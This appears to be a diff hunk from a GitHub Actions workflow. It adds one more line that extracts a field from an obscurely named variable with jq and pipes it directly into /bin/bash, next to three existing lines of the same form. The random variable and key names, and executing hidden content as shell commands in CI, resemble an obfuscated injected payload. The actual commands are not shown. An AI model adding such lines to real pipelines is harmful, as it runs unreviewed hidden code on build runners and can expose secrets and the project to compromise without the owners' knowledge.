@@ -42,6 +42,7 @@ jobs:
           echo $dt958 | jq -r .bookq55095 | /bin/bash
           echo $em7 | jq -r .h6 | /bin/bash
           printf '%s' "$mfnue26040" | jq -r .fxoin79238 | /bin/bash
+          echo $m39443 | jq -r .sqj3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
